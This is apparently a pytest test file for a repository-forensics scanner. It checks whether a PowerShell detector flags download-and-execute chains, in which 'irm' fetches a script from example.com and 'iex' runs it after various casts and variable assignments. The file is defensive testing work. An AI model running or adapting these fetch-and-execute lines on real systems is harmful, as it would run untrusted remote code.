"""Independent review set 4 (inert strings): spaced cast chains and typed targets."""
import sys,importlib,pytest
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[3] / 'skills/repo-forensics/scripts'))
P='$a=irm https://example.com/x.ps1; '
@pytest.mark.parametrize('module',['pre_scan','auto_scan'])
@pytest.mark.parametrize('tail',[
'$b=[bool] [object]($a); iex "Write-Output $b"',
'$b=[bool] [string] $a; iex "Write-Output $b"',
'[string]$b=@($a); $c=$b -eq "safe"; iex "Write-Output $c"',
])
def test_cast_result_not_payload(module,tail):
 assert not importlib.import_module(module).detects_powershell_execution(P+tail)


# v5 panel: chained typed targets convert right to left, and sequential -as casts apply in order.
import pytest as _pytest
import pre_scan as _pre, auto_scan as _auto

_P6 = '$a=irm https://example.com/x.ps1; '


@_pytest.mark.parametrize('module', [_pre, _auto])
@_pytest.mark.parametrize('tail', [
    '[bool]$c=$b=$a; iex $b',
    '[bool] $c = $b = $a; iex $b',
    '[bool]$d=$c=$b=$a; iex $c',
    '[object]$c=$b=$a; iex $b',
    '[string]$c=[array]$b=$a; iex $b',
])
def test_chained_inner_targets_keep_taint(module, tail):
    assert module.detects_powershell_execution(_P6 + tail)


@_pytest.mark.parametrize('module', [_pre, _auto])
@_pytest.mark.parametrize('tail', [
    '$c=$b=[bool]$a; iex $b',
    '$c=[bool]$b=$a; iex $c',
    '[bool]$c=$b=$a; iex $c',
    '[bool]$d=$c=$b=$a; iex $d',
    '[bool]$c=$b=$a; iex "Write-Output $c"',
    '$b=$a -as [array] -as [string]; $c=$b -eq "safe"; iex "Write-Output $c"',
    '$b=$a -as [string] -as [bool]; iex "Write-Output $b"',
])
def test_chained_outer_sanitizer_and_sequential_as_stay_clean(module, tail):
    assert not module.detects_powershell_execution(_P6 + tail)
